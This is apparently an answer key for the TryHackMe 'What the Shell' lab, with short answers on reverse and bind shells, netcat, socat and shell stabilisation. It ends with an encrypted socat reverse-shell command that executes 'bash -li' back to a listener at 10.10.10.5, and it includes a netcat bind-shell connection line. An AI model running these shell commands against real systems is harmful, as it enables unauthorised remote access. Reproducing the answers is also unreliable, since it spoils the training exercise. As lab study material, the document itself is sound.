# TryHackMe What the Shell
## Types of shell
1.  Which type of shell connects back to a listening port on your computer, Reverse (R) or Bind (B)?l
	R
2. You have injected malicious shell code into a website. Is the shell you receive likely to be interactive? (Y or N)
	N
3. When using a bind shell, would you execute a listener on the Attacker (A) or the Target (T)?
	T
## Netcat
1.  Which option tells netcat to listen?

	-l
2. How would you connect to a bind shell on the IP address: 10.10.10.11 with port 8080?

	nc 10.10.10.11 8080
## Netcat Shell Stabilisation
1.  How would you change your terminal size to have 238 columns?

 	stty cols 238
2. What is the syntax for setting up a Python3 webserver on port 80?

	sudo python3 -m http.server 80

## Socat
1. How would we get socat to listen on TCP port 8080?
	TCP-L:8080
## Socat Encrypted Shells
1. What is the syntax for setting up an OPENSSL-LISTENER using the tty technique from the previous task? Use port 53, and a PEM file called "encrypt.pem"
	
	socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:'tty',raw,echo=0
2. If your IP is 10.10.10.5, what syntax would you use to connect back to this listener?

	socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane